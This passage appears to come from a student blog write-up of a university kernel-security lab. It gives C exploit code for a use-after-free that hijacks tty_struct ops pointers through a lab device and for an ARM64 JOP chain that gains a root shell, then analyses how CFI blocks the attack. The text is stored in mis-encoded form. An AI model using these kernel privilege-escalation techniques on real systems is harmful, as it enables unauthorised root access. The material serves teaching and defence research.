†å†…å­˜çš„åˆ†é…å’Œå›æ”¶è¿›è¡Œç»Ÿä¸€ç®¡ç†ï¼Œå¯¹äºæ¯ä¸€å—å†…å­˜ç§°ä¹‹ä¸ºchunk\nè¢«ç”¨æˆ·freeæ‰çš„chunkï¼Œé€šè¿‡æŒ‡é’ˆè¿æ¥æˆé“¾è¡¨ï¼Œä¸åŒå¤§å°çš„å†…å­˜è¿æ¥æˆä¸åŒçš„é“¾è¡¨ï¼Œæ¯ä¸€ä¸ªé“¾è¡¨ç§°ä¹‹ä¸ºbinï¼Œå½“å†æ¬¡éœ€è¦åˆ†é…æŸä¸€ä¸ªå¤§å°çš„å†…å­˜æ—¶ï¼Œå°±åœ¨å¯¹åº”å¤§å°çš„chunkè¿æ¥æˆçš„binä¸­åˆ†é…å³å¯ï¼Œè¿›è€Œå‡å°‘ç¢ç‰‡ï¼Œä¹Ÿå¯ä»¥æé«˜å†…å­˜åˆ†é…æ•ˆç‡\nå› æ­¤å½“æˆ‘ä»¬åœ¨å †ä¸Šåˆ†é…ç›¸åŒå¤§å°å†…å­˜æ—¶ï¼Œè¢«freeçš„å†…å­˜è¢«æ¥å…¥binä¸­ï¼Œå†æ¬¡åˆ†é…ç›¸åŒå¤§å°çš„å†…å­˜å°±ä¼šä»binä¸Šåˆ†é…ï¼Œè¿›è€Œæå¤§å¢åŠ äº†åˆ†é…åˆ°çš„å†…å­˜åœ°å€ç›¸åŒçš„æ¦‚ç‡ï¼›è¿™ä¹Ÿå°±è§£é‡Šäº†ä¸ºä»€ä¹ˆåœ¨UAFåˆ©ç”¨ä¸­ï¼Œä¸¤æ¬¡åˆ†é…çš„å†…å­˜åœ°å€ä¼šä¸€æ ·\nTask1ï¼šè®¾å¤‡æ¥å£çš„ä½¿ç”¨ \u0026amp; æ€è€ƒé¢˜2 æ ¹æ®UAFçš„åŸç†ï¼Œæˆ‘ä»¬å…ˆä¸¤æ¬¡æ‰“å¼€/dev/zjudevè®¾å¤‡ï¼Œåˆ†é…å¹¶é‡Šæ”¾å¤§å°ä¸ºsizeof(tty_struct)çš„ç¼“å†²åŒºï¼Œè¿™æ ·åšæ˜¯ä¸ºäº†ä¹‹åæ‰“å¼€/dev/ptmxè®¾å¤‡ï¼Œåˆ†é…tty_structç»“æ„ä½“æ—¶èƒ½å¤Ÿåˆ†é…åˆ°ä¸/dev/zjudevç›¸åŒåœ°å€çš„ç¼“å†²åŒº ä¹‹åæˆ‘ä»¬æ‰“å¼€/dev/ptmxè®¾å¤‡ï¼Œå¹¶åˆ¤æ–­æ˜¯å¦åˆ†é…åˆ°äº†ä¸/dev/zjudevç›¸åŒçš„ç¼“å†²åŒºï¼›åˆ¤æ–­çš„æ–¹æ³•æ˜¯ï¼Œæˆ‘ä»¬è§‚å¯Ÿtty_structç»“æ„ä½“ï¼š 1 2 3 4 5 6 7 8 9 10 struct tty_struct { int\tmagic; struct kref kref; struct device *dev;\t/* class device or NULL (e.g. ptys, serdev) */ struct tty_driver *driver; const struct tty_operations *ops // ... } /* tty magic number */ #define TTY_MAGIC\t0x5401 åœ¨ç»“æ„ä½“çš„èµ·å§‹åœ°å€æœ‰ä¸€ä¸ªmagicå˜é‡ï¼Œå…¶å€¼ä¼šè¢«åˆå§‹åŒ–æˆ0x5401ï¼Œè€Œæˆ‘ä»¬å°½ç®¡ä¸çŸ¥é“tty_structç»“æ„ä½“çš„åœ°å€ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡è¯»å–/dev/zjudevåˆ†é…çš„ç¼“å†²åŒºå†…å®¹ï¼Œåˆ¤æ–­æœ€å¼€å§‹çš„å››ä¸ªå­—èŠ‚æ˜¯å¦ä¸º0x5401å³å¯\nå…·ä½“å®ç°ä¸Šï¼Œå¯ä»¥ä½¿ç”¨ä¸€ä¸ªæ­»å¾ªç¯ï¼Œä¸æ–­æ‰“å¼€/dev/ptmxè®¾å¤‡ï¼Œåˆ¤æ–­/dev/zjudevçš„ç¼“å†²åŒºå†…å®¹æ˜¯å¦ä¸º0x5401ï¼Œå½“ç»“æœä¸ºæ˜¯ï¼Œåˆ™è·³å‡ºå¾ªç¯ï¼Œè¿”å›ptmxçš„æ–‡ä»¶æè¿°ç¬¦ ä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡è°ƒç”¨/dev/zjudevè®¾å¤‡çš„writeæ¥å£ï¼Œä¿®æ”¹ç¼“å†²åŒºå†…å®¹ï¼Œè¿›è€Œä¿®æ”¹tty_structç»“æ„ä½“çš„å†…å®¹ Q2. å¦‚ä½•ç¡®å®šè‡ªå·±æ‰€æ§åˆ¶çš„æŒ‡é’ˆä¸€å®šè¢«åˆ†é…ç»™ tty_structç»“æ„ä½“\nè§ä¹‹å‰çš„åˆ†æï¼Œé€šè¿‡tty_structç»“æ„ä½“å¼€å¤´çš„magicå˜é‡çš„å€¼è¿›è¡Œåˆ¤æ–­\né™„ä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 #define TTY_STRUCT_SIZE 0x2B8 #define TTY_MAGIC 0x5401 size_t tty_op_buf[36]; char tty_buf[TTY_STRUCT_SIZE]; int init_dev() { int dev1 = open(\u0026#34;/dev/zjudev\u0026#34;, O_RDWR); int dev2 = open(\u0026#34;/dev/zjudev\u0026#34;, O_RDWR); ioctl(dev1, 0x0001, TTY_STRUCT_SIZE); close(dev1); return dev2; } int init_ptmx(int dev_fd) { int ptmx_fd; for (;;) { ptmx_fd = open(\u0026#34;/dev/ptmx\u0026#34;, O_RDWR | O_NOCTTY); memset(tty_buf, \u0026#39;\\0\u0026#39;, sizeof(tty_buf)); read(dev_fd, tty_buf, TTY_STRUCT_SIZE - 1); for (size_t i = 0; i \u0026lt; TTY_STRUCT_SIZE; i += 8) { char v_str[9]; memcpy(v_str, tty_buf + i, 8); v_str[8] = \u0026#39;\\0\u0026#39;; printf(\u0026#34;tty_buf + %lu = 0x%lx\\n\u0026#34;, i, *(size_t*)v_str); } size_t magic = 0; memcpy(\u0026amp;magic, tty_buf, 4); if (magic == TTY_MAGIC) break; printf(\u0026#34;\\n\u0026#34;); } printf(\u0026#34;TTY_MAGIC match! ptmx_fd = %d\\n\u0026#34;, ptmx_fd); return ptmx_fd; } int main(int argc, char* argv[]) { int dev_fd = init_dev(); int ptmx_fd = init_ptmx(dev_fd); return 0; } Task2ï¼šç®€å•è·å–root shell \u0026amp; æ€è€ƒé¢˜3 è§‚å¯Ÿtty_structç»“æ„ä½“ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°æœ‰ä¸€ä¸ªconst struct tty_operations* opsæŒ‡é’ˆï¼Œå…¶æŒ‡å‘çš„æ˜¯ä¸€ç»„å¯ä»¥è¢«è°ƒç”¨çš„å‡½æ•°æŒ‡é’ˆï¼Œå½“æˆ‘ä»¬å¯¹/dev/ptmxè®¾å¤‡è¿›è¡Œæ“ä½œæ—¶ï¼Œè°ƒç”¨çš„å°±æ˜¯å…¶ä¸­çš„å‡½æ•°ï¼›struct tty_operationsçš„å…·ä½“ç»“æ„å¦‚ä¸‹ï¼š 1 2 3 4 5 6 7 8 9 10 struct tty_operations { struct tty_struct * (*lookup)(struct tty_driver *driver, struct file *filp, int idx); int (*install)(struct tty_driver *driver, struct tty_struct *tty); void (*remove)(struct tty_driver *driver, struct tty_struct *tty); int (*open)(struct tty_struct * tty, struct file * filp); void (*close)(struct tty_struct * tty, struct file * filp); void (*shutdown)(struct tty_struct *tty); // ... } ç”±äºæˆ‘ä»¬ä¹‹å‰ä½¿å¾—tty_structçš„åœ°å€å’Œ/dev/zjudevä¸­åˆ†é…çš„ç¼“å†²åŒºèµ·å§‹åœ°å€ç›¸åŒï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡è¦†å†™ç¼“å†²åŒºè¿›è€Œä¿®æ”¹opsæŒ‡é’ˆçš„å€¼ï¼Œè€Œæˆ‘ä»¬å®Œå…¨å¯ä»¥å°†opsæŒ‡å‘ä¸€å—å¤§å°å’Œtty_operationsç›¸åŒçš„åŒºåŸŸï¼Œä½†é‡Œé¢çš„å‡½æ•°æŒ‡é’ˆå…¨éƒ½æŒ‡å‘hack_credå‡½æ•°çš„åœ°å€ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡è°ƒç”¨/dev/ptmxè®¾å¤‡çš„æ–¹æ³•ï¼Œè¿›è€Œè°ƒç”¨hack_credå‡½æ•°ï¼Œè·å–rootæƒé™ é¦–å…ˆæˆ‘ä»¬éœ€è¦è·å¾—hack_credçš„å‡½æ•°åœ°å€ï¼Œç”±äºæ²¡æœ‰å¼€å§‹ASLRï¼Œå› æ­¤ç›´æ¥åœ¨System.mapé‡Œé¢æŸ¥è¡¨å³å¯ å¯ä»¥çœ‹åˆ°tty_operationsä¸­å…±æœ‰36ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œæ¯ä¸ªå‡½æ•°æŒ‡é’ˆå¤§å°ä¸º8Bï¼Œå› æ­¤æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªå¤§å°ä¸º36*8Bçš„æ•°ç»„tty_op_bufï¼Œå…¶ä¸­æ‰€æœ‰å‡½æ•°æŒ‡é’ˆéƒ½æŒ‡å‘hack_credï¼Œä¹‹åè·å–ptr = \u0026amp;tty_op_bufï¼Œå°†ptrè¦†ç›–opsæŒ‡é’ˆï¼Œè¿›è€Œè°ƒç”¨hack_cred Q3. ä¸ºä»€ä¹ˆä¸èƒ½ç›´æ¥é€šè¿‡ UAF æ§åˆ¶ cred ç»“æ„ä½“ç›´æ¥ä¿®æ”¹å…¶å†…å®¹ï¼Ÿæœ‰æ²¡æœ‰åŠæ³•èƒ½å¤Ÿé€šè¿‡ UAF æ¥åˆ©ç”¨æ–°ç‰ˆæœ¬çš„ cred ç»“æ„ä½“å‘¢ï¼Ÿ\nåœ¨Linux kernel 4.5ç‰ˆæœ¬ä¹‹å‰æ˜¯å¯ä»¥çš„ï¼Œä½†æ˜¯åœ¨Linux kernel 4.5ç‰ˆæœ¬åŠä¹‹åå°±ä¸å¯ä»¥äº†ï¼Œå¯ä»¥æ¯”è¾ƒkernel 4.5ç‰ˆæœ¬å¯¹cred_initå‡½æ•°çš„ä¿®æ”¹(å‚è€ƒäº†https://zhuanlan.zhihu.com/p/437464189)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 4.4.72 /* * initialise the credentials stuff */ void __init cred_init(void) { /* allocate a slab in which we can store credentials */ cred_jar = kmem_cache_create(\u0026#34;cred_jar\u0026#34;, sizeof(struct cred), 0, SLAB_HWCACHE_ALIGN|SLAB_PANIC, NULL); } 4.5 /* * initialise the credentials stuff */ void __init cred_init(void) { /* allocate a slab in which we can store credentials */ cred_jar = kmem_cache_create(\u0026#34;cred_jar\u0026#34;, sizeof(struct cred), 0,SLAB_HWCACHE_ALIGN|SLAB_PANIC|SLAB_ACCOUNT, NULL); } å¯ä»¥æ³¨æ„åˆ°ï¼Œåœ¨ slab çš„åˆ›å»º flag ä¸­å¤šäº† ä¸€ä¸ª SLAB_ACCOUNTï¼Œæ„å‘³ç€cred_jarå’Œkmallocä¸å†åˆå¹¶ï¼Œä¹Ÿå°±æ˜¯è¯´credåˆ†é…çš„å†…å­˜å’Œkmallocåˆ†é…çš„å†…å­˜æ¥è‡ªä¸¤ä¸ªä¸åŒçš„åŒºåŸŸï¼Œå› æ­¤æ— æ³•ä½¿å¾—é€šè¿‡kmallocåˆ†é…çš„å†…å­˜å’Œåˆ†é…ç»™credçš„å†…å­˜æ‹¥æœ‰ç›¸åŒçš„èµ·å§‹åœ°å€ï¼Œä¹Ÿå°±æ— æ³•é€šè¿‡UAFæ§åˆ¶credç»“æ„ä½“\né™„ä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 #define TTY_STRUCT_SIZE 0x2B8 #define TTY_MAGIC 0x5401 #define HACK_CRED_ADDR 0xffff80001083aa84 size_t tty_op_buf[36]; char tty_buf[TTY_STRUCT_SIZE]; void exp_task2(int dev_fd, int ptmx_fd) { printf(\u0026#34;Jump into exp_task2!\\n\u0026#34;); // åˆ›å»ºtty_op_bufï¼Œå°†å…¶ä¸­çš„å‡½æ•°æŒ‡é’ˆéƒ½ä¿®æ”¹ä¸ºHACK_CRED_ADDR for (size_t i = 0; i \u0026lt; 36; ++i) tty_op_buf[i] = HACK_CRED_ADDR; char my_buf[32]; size_t ptr = (size_t)(\u0026amp;tty_op_buf); printf(\u0026#34;ptr = %lx\\n\u0026#34;, ptr); memcpy(my_buf, tty_buf, 24); // ä¿®æ”¹opsæŒ‡é’ˆï¼ŒæŒ‡å‘tty_op_buf memcpy(my_buf + 24, \u0026amp;ptr, 8); for (size_t i = 0; i \u0026lt; 32; i += 8) printf(\u0026#34;my_buf + %lu = 0x%lx\\n\u0026#34;, i, *(size_t*)(my_buf + i)); // è¦†å†™ç¼“å†²åŒº write(dev_fd, my_buf, 32); // æ£€æŸ¥ç¼“å†²åŒºæ˜¯å¦è¢«ä¿®æ”¹ printf(\u0026#34;check ttyy_buf\\n\u0026#34;); read(dev_fd, tty_buf, TTY_STRUCT_SIZE - 1); for (size_t i = 0; i \u0026lt; 32; i += 8) printf(\u0026#34;tty_buf + %lu = 0x%lx\\n\u0026#34;, i, *(size_t*)(tty_buf + i)); // è°ƒç”¨closeæ“ä½œptmxè®¾å¤‡ï¼ŒçœŸæ­£è°ƒç”¨çš„æ˜¯hack_credå‡½æ•° close(ptmx_fd); system(\u0026#34;/bin/sh\u0026#34;); return; } int main(int argc, char* argv[]) { int dev_fd = init_dev(); int ptmx_fd = init_ptmx(dev_fd); exp_task2(dev_fd, ptmx_fd); return 0; } Task3ï¼šgadgetè·å–root shell \u0026amp; æ€è€ƒé¢˜4 åœ¨task3ä¸­æˆ‘ä»¬æ— æ³•ç›´æ¥è°ƒç”¨hack_credå‡½æ•°è·å–rootæƒé™ï¼Œéœ€è¦ä½¿ç”¨gadgetï¼Œæœ¬è´¨ä¸Šå°±æ˜¯é€šè¿‡gadgetæ§åˆ¶ä¼ å‚çš„å¯„å­˜å™¨ï¼Œè¿›è€Œä¾æ¬¡è°ƒç”¨struct cred* root_cred = prepare_kernel_cred(NULL)å’Œcommit_creds(root_cred)è·å–rootæƒé™\næˆ‘ä»¬å…ˆè§‚å¯Ÿä¸€ä¸‹è¿™å‡ ä¸ªgadgetåˆ†åˆ«åšäº†ä»€ä¹ˆ\nzju_gadget1: å°† [x0 + 0x38]åœ°å€çš„å€¼èµ‹å€¼ç»™x1ï¼Œå°†x2çš„å€¼èµ‹å€¼ç»™x0ï¼Œè·³è½¬åˆ°x1å‚¨å­˜çš„åœ°å€å¤„ zju_gadget2: å°†x0ç½®0ï¼Œå°†[x2 + 0x28]åœ°å€çš„å€¼èµ‹å€¼ç»™x1ï¼Œè·³è½¬åˆ°x1å‚¨å­˜çš„åœ°å€å¤„ zju_gadget3: ç›´æ¥è¿”å› ä¹‹åæˆ‘ä»¬çš„æ€è·¯å°±æ˜ç¡®äº†ï¼Œæˆ‘ä»¬é¦–å…ˆé€šè¿‡zju_gadget3è·å–ty_structçš„åœ°å€ï¼Œä¹‹åé€šè¿‡zju_gadget2è°ƒç”¨prepare_kernel_credæ–¹æ³•ï¼Œè·å–è¿”å›å€¼ï¼Œä¹‹åå†è°ƒç”¨commit_credsæ–¹æ³•è·å–rootæƒé™ é¦–å…ˆæˆ‘ä»¬éœ€è¦è·å–tyy_structçš„åœ°å€\nåœ¨ä¹‹å‰çš„å®éªŒä¸­ï¼Œå°½ç®¡æˆ‘ä»¬å¯ä»¥ä¿®æ”¹tyy_structç»“æ„çš„å€¼ï¼Œä½†æ˜¯æˆ‘ä»¬éœ€è¦åœ¨ä¹‹åå°†tty_structçš„åœ°å€ä½œä¸ºå‚æ•°ä¼ å…¥gadgetï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å¾—åˆ°å®ƒçš„åœ°å€ åœ¨armä¸­ï¼Œå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¼šä¿å­˜åœ¨x0ä¸­ï¼Œå‡½æ•°è¿”å›çš„å€¼ä¹Ÿä¼šä¿å­˜åœ¨x0ä¸­ï¼Œè€Œæˆ‘ä»¬è§‚å¯Ÿioctlæ–¹æ³• 1 2 3 4 5 6 7 // x0 = tty_struct_of_fd, x1 = p1, x2 = p2 int ioctl(int fd, unsigned long int p1, void *p2) { ioctl_operation(tty_struct_of_fd, p1, p2); } // x0 = \u0026amp;tty, x1 = cmd, x2 = arg int (*ioctl)(struct tty_struct *tty, unsigned int cmd, unsigned long arg); å¯ä»¥å…¶ä¼šå°†å‚æ•°æŒ‰ç…§é¡ºåºä¼ å…¥ioctl_operationï¼Œä¹‹ååœ¨ioctlå‡½æ•°æŒ‡é’ˆä¸­ï¼Œç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯tty_structçš„æŒ‡é’ˆï¼Œå› æ­¤x0å°±æ˜¯tty_structçš„èµ·å§‹åœ°å€\næˆ‘ä»¬å°†ioctlæ–¹æ³•è¦†å†™ä¸ºzju_gadget3ï¼Œreturnå¾—åˆ°çš„è¿”å›å€¼(x0)å°±æ˜¯tty_structçš„èµ·å§‹åœ°å€ï¼›éœ€è¦æ³¨æ„ç”±äºè¿”å›å€¼ä¸ºintç±»å‹ï¼Œåœ¨èµ‹å€¼ä¸º64bitç±»å‹å˜é‡åï¼Œéœ€è¦æ‰‹åŠ¨å°†æœ€é«˜16ä½èµ‹å€¼ä¸º0xffff ä¹‹åæˆ‘ä»¬éœ€è¦è°ƒç”¨prepare_kernel_gadgetå‡½æ•°\né¦–å…ˆè¿™ä¸ªå‡½æ•°çš„å‚æ•°éœ€è¦æ˜¯NULLï¼Œè€ŒNULLåœ¨Cä¸­å°±æ˜¯0ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥æƒ³åˆ°åˆ©ç”¨zju_gadget2ï¼ŒåŒæ—¶x0æ­£å¥½ä½œä¸ºprepare_kernel_gadgetçš„ç¬¬ä¸€ä¸ªå‚æ•° å¦‚ä½•è°ƒç”¨prepare_kernel_gadgetå‡½æ•°ï¼Ÿå¯ä»¥å‘ç°zju_gadget2å°†[x2 + 0x28]åœ°å€çš„å€¼èµ‹å€¼ç»™x1ï¼Œä¹‹åè·³è½¬åˆ°x1å‚¨å­˜çš„åœ°å€å¤„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å°†prepare_kernel_gadgetçš„åœ°å€æ”¾åˆ°[x2 + 0x28] x2æ˜¯å¯ä»¥é€šè¿‡ioctlä¼ å…¥çš„å‚æ•°ï¼Œä¹Ÿå°±æ˜¯p2ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ç›´æ¥ä¼ å…¥tty_structçš„èµ·å§‹åœ°å€ï¼Œå°†[addr+0x28]å¤„çš„åœ°å€è¦†å†™æˆprepare_kernel_gadgetçš„åœ°å€å³å¯ æœ€åå°†è¿”å›å€¼ä¿å­˜ï¼Œä¹‹åéœ€è¦ä¼ å…¥commit_creds ä¹‹åå°±æ˜¯è°ƒç”¨commit_credsï¼Œå’Œä¹‹å‰ä¸€æ ·çš„æ€è·¯ï¼Œåœ¨zju_gadget1ä¸­ï¼Œå°† [x0 + 0x38]åœ°å€çš„å€¼èµ‹å€¼ç»™x1ï¼Œå°†x2çš„å€¼èµ‹å€¼ç»™x0ï¼Œè·³è½¬åˆ°x1å‚¨å­˜çš„åœ°å€å¤„ï¼›å› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡è¦†å†™ [x0 + 0x38]åœ°å€å¤„çš„å€¼ä¸ºcommit_credsçš„åœ°å€å¯¹å…¶è°ƒç”¨ï¼ŒåŒæ—¶å°†prepare_kernel_credçš„è¿”å›å€¼ä½œä¸ºå‚æ•°ä¼ å…¥x2ï¼Œåœ¨zju_gadget1ä¸­ä¼ å…¥x0ï¼Œè¿›è€Œè°ƒç”¨å‡½æ•°\nQ4. ä¸ºä»€ä¹ˆç¬¬äºŒæ­¥å¯ä»¥ç›´æ¥retè·å–åˆ° tty_structç»“æ„ä½“çš„åœ°å€ï¼Ÿret æ‰§è¡Œå‰åçš„æ§åˆ¶æµæ˜¯ä»€ä¹ˆæ ·çš„ï¼Ÿ\næ ¹æ®ä¹‹å‰çš„åˆ†æï¼Œå½“è°ƒç”¨int (*ioctl)(struct tty_struct *tty, unsigned int cmd, unsigned long arg)å‡½æ•°ç­¾åæ—¶ï¼Œç¬¬ä¸€ä¸ªå‚æ•°å°±åˆ° tty_structç»“æ„ä½“çš„åœ°å€ï¼Œé€šè¿‡x0å¯„å­˜å™¨ä¼ å‚ï¼›è€Œæˆ‘ä»¬å®é™…ä¸Šè°ƒç”¨çš„æ˜¯zju_gadget3ï¼Œæ­¤æ—¶ä¼ å‚æ˜¯æ­£å¸¸çš„ï¼Œä½†æ˜¯åœ¨å‡½æ•°ä½“ä¸­ç›´æ¥returnï¼Œæ²¡æœ‰ä¿®æ”¹x0å¯„å­˜å™¨çš„å€¼ï¼›è€Œarmæ¶æ„ä¸­å‡½æ•°çš„è¿”å›å€¼ä¹Ÿå‚¨å­˜åœ¨x0å¯„å­˜å™¨ä¸­ï¼Œå‡½æ•°è¿”å›å€¼ä¹Ÿå°±æ˜¯ tty_structç»“æ„ä½“çš„åœ°å€\næ§åˆ¶æµï¼šmy_function -\u0026gt; int ioctl(int fd, unsigned long int p1, void *p2) -\u0026gt; \u0026hellip; tty_optarions.ioctl(struct tty_struct *tty, unsigned int cmd, unsigned long arg) -\u0026gt; zju_gadget3 -\u0026gt; \u0026hellip; -\u0026gt; my_function\né™„ä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 #define TTY_STRUCT_SIZE 0x2B8 #define TTY_MAGIC 0x5401 #define ZJU_GADGET_ONE_ADDR 0xffff80001083aa44 #define ZJU_GADGET_TWO_ADDR 0xffff80001083aa5c #define ZJU_GADGET_THREE_ADDR 0xffff80001083aa74 #define PREPARE_KERNEL_CRED_ADDR 0xffff8000100b6030 #define COMMIT_CREDS_ADDR 0xffff8000100b5bac size_t tty_op_buf[36]; char tty_buf[TTY_STRUCT_SIZE]; int init_dev() { int dev1 = open(\u0026#34;/dev/zjudev\u0026#34;, O_RDWR); int dev2 = open(\u0026#34;/dev/zjudev\u0026#34;, O_RDWR); ioctl(dev1, 0x0001, TTY_STRUCT_SIZE); close(dev1); return dev2; } int init_ptmx(int dev_fd) { int ptmx_fd; for (;;) { ptmx_fd = open(\u0026#34;/dev/ptmx\u0026#34;, O_RDWR | O_NOCTTY); memset(tty_buf, \u0026#39;\\0\u0026#39;, sizeof(tty_buf)); read(dev_fd, tty_buf, TTY_STRUCT_SIZE - 1); for (size_t i = 0; i \u0026lt; TTY_STRUCT_SIZE; i += 8) { char v_str[9]; memcpy(v_str, tty_buf + i, 8); v_str[8] = \u0026#39;\\0\u0026#39;; printf(\u0026#34;tty_buf + %lu = 0x%lx\\n\u0026#34;, i, *(size_t*)v_str); } size_t magic = 0; memcpy(\u0026amp;magic, tty_buf, 4); if (magic == TTY_MAGIC) break; printf(\u0026#34;\\n\u0026#34;); } printf(\u0026#34;TTY_MAGIC match! ptmx_fd = %d\\n\u0026#34;, ptmx_fd); return ptmx_fd; } void exp_task3(int dev_fd, int ptmx_fd) { printf(\u0026#34;Jump into exp_task3!\\n\u0026#34;); memset(tty_op_buf, \u0026#39;\\0\u0026#39;, sizeof(tty_op_buf)); char my_buf[0x40]; size_t ptr = (size_t)(\u0026amp;tty_op_buf); size_t prepare_kernel_cred_addr = PREPARE_KERNEL_CRED_ADDR; size_t commit_creds_addr = COMMIT_CREDS_ADDR; memcpy(my_buf, tty_buf, 0x40); memcpy(my_buf + 24, \u0026amp;ptr, 8); memcpy(my_buf + 0x28, \u0026amp;prepare_kernel_cred_addr, 8); memcpy(my_buf + 0x38, \u0026amp;commit_creds_addr, 8); write(dev_fd, my_buf, 0x40); tty_op_buf[12] = ZJU_GADGET_THREE_ADDR; size_t tty_addr = ioctl(ptmx_fd, 0x0, 0x0) | 0xffff000000000000; printf(\u0026#34;tty_addr = 0x%lx\\n\u0026#34;, tty_addr); tty_op_buf[12] = ZJU_GADGET_TWO_ADDR; commit_creds_addr = ioctl(ptmx_fd, 0x0, my_buf) | 0xffff000000000000; printf(\u0026#34;commit_creds_addr = 0x%lx\\n\u0026#34;, commit_creds_addr); tty_op_buf[12] = ZJU_GADGET_ONE_ADDR; ioctl(ptmx_fd, 0x0, commit_creds_addr); system(\u0026#34;/bin/sh\u0026#34;); return; } int main(int argc, char* argv[]) { int dev_fd = init_dev(); int ptmx_fd = init_ptmx(dev_fd); exp_task3(dev_fd, ptmx_fd); return 0; } Task4ï¼šå†…æ ¸CFIä¿æŠ¤ ä½¿ç”¨objdumpåæ±‡ç¼–å¼€å¯CFIçš„å†…æ ¸é•œåƒ vmlinuxï¼Œè·å¾—æ±‡ç¼–ä»£ç ï¼Œæäº¤ä»»æ„ä¸€ä¸ªé—´æ¥è°ƒç”¨çš„æ±‡ç¼–ä»£ç ï¼Œå¹¶è¯¦ç»†è§£é‡ŠCFIæ˜¯å¦‚ä½•é˜²å¾¡JOPæ”»å‡» æˆ‘ä»¬åˆ†åˆ«åœ¨å¼€å§‹CFIå’Œæ²¡å¼€å¯CFIçš„vmlinuxé•œåƒä¸­åæ±‡ç¼–tty_driver_flush_bufferå‡½æ•°ï¼Œå…³é”®ä»£ç å¦‚ä¸‹\nCFI:\nNoCFI:\nå…³æ³¨å¦‚ä¸‹ç‰‡æ®µï¼š\n1 2 3 4 5 6 7 ffff800008bd9594:\tb4000108 cbz\tx8, ffff800008bd95b4 \u0026lt;tty_driver_flush_buffer+0x38\u0026gt; ffff800008bd9598:\td00061c9 adrp\tx9, ffff800009813000 \u0026lt;regulator_get_current_limit.cfi_jt\u0026gt; ffff800008bd959c:\t912d0129 add\tx9, x9, #0xb40 ffff800008bd95a0:\tcb090109 sub\tx9, x8, x9 ffff800008bd95a4:\t93c90d29 ror\tx9, x9, #3 ffff800008bd95a8:\tf100a93f cmp\tx9, #0x2a ffff800008bd95ac:\t540000c2 b.cs\tffff800008bd95c4 \u0026lt;tty_driver_flush_buffer+0x48\u0026gt; // b.hs, b.nlast å¯ä»¥çœ‹åˆ°åœ¨å¼€å¯äº†CFIä¹‹åï¼Œå‡ºç°äº†regulator_get_current_limit.cfi_jtæ ‡ç­¾ï¼Œå¦‚æœx8å’Œx9å¯„å­˜å™¨çš„å€¼ä¸æ»¡è¶³è¦æ±‚ï¼Œå°±ä¼šè·³è½¬åˆ°è¯¥æ ‡ç­¾å¯¹åº”çš„å‡½æ•°å¤„ï¼Œä¹‹åè°ƒç”¨handle_cfi_failureå¤„ç†CFI failureï¼›æ€»ç»“æ¥è¯´ï¼ŒCFIé€šè¿‡å¯¹å‡½æ•°è·³è½¬åœ°å€çš„æ£€æŸ¥ï¼Œè¿›è€Œé˜²æ­¢JOPæ”»å‡»\né‡æ–°è¿è¡ŒJOPæ”»å‡»ç¨‹åºï¼ŒæŸ¥çœ‹æ˜¯å¦CFIæ˜¯å¦èƒ½èµ·ä½œç”¨ã€‚æäº¤demsgä¸­åŒ…å«CFI Failureæˆªå›¾ é‡æ–°è¿è¡ŒJOPæ”»å‡»ç¨‹åºï¼Œå‘ç°CFIç”Ÿæ•ˆï¼Œæ— æ³•è·³è½¬åˆ°ç›®æ ‡å‡½æ•°\nä¹‹åè°ƒç”¨dmesgï¼Œå‘ç°è§¦å‘äº†cfi_failure\nWritten by Jiacheng Hu, at Zhejiang University, Hangzhou, China.\n","date":"2023-06-07T23:50:00Z","image":"https://unicocn.github.io/p/jop/cover_hu5b167a362bf183fa776f2ef90b695ed1_16596_120x120_fill_q75_box_smart1.jpg","permalink":"https://unicocn.github.io/p/jop/","title":"JOP | Linuxå†…æ ¸æ”»é˜²"},{"content":"ROP | Linuxå†…æ ¸æ”»é˜² Link: https://zjusec.gitee.io/syssec23-stu/lab2/\nTask1ï¼šç»•è¿‡stack canaryå’ŒKASLR é¦–å…ˆæ ¹æ®å®éªŒæŒ‡å—ï¼Œå½“æˆ‘ä»¬readæ—¶ï¼Œè¯»å–çš„æ˜¯å…¨å±€å˜é‡prev_cmdï¼Œè€Œå½“æˆ‘ä»¬writeçš„æ—¶å€™ï¼Œä¼šå°†bufferå…ˆèµ‹å€¼ç»™cmdï¼Œå†å°†cmdèµ‹å€¼ç»™prev_cmdï¼›åœ¨zjubof_write4ä¸­ï¼Œçœ‹ä¼¼å¯¹cmd.lengthä½œå‡ºäº†é™åˆ¶ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰å¯¹lenä½œå‡ºé™åˆ¶ï¼Œå› æ­¤å­˜åœ¨overflowæ¼æ´ï¼Œå¯ä»¥é€šè¿‡æº¢å‡ºä¿®æ”¹cmd.lengthï¼Œè¿›è€Œå°†canary/oldfp/raè¯»åˆ°prev_cmdä¸­ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 ssize_t zjubof_write4(char *buffer,size_t len) { struct cmd_struct cmd; printk(\u0026#34;zjubof_write4\\n\u0026#34;); memset(cmd.command, 0, 16); 